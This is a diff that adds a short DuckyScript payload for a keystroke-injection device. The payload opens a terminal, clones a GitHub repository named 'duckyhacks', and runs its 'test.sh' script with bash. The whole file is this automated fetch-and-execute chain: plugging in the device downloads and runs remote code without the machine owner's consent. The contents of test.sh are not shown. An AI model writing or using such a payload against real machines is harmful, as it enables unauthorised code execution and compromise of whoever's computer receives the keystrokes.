@@ -1,0 +1,11 @@
+CONTROL ALT T
+DELAY 5000
+STRING cd ~/Desktop
+ENTER
+STRING git clone https://github.com/Amazingct/duckyhacks.git
+ENTER
+DELAY 10000
+STRING cd duckyhacks
+ENTER
+STRING bash test.sh
+ENTER
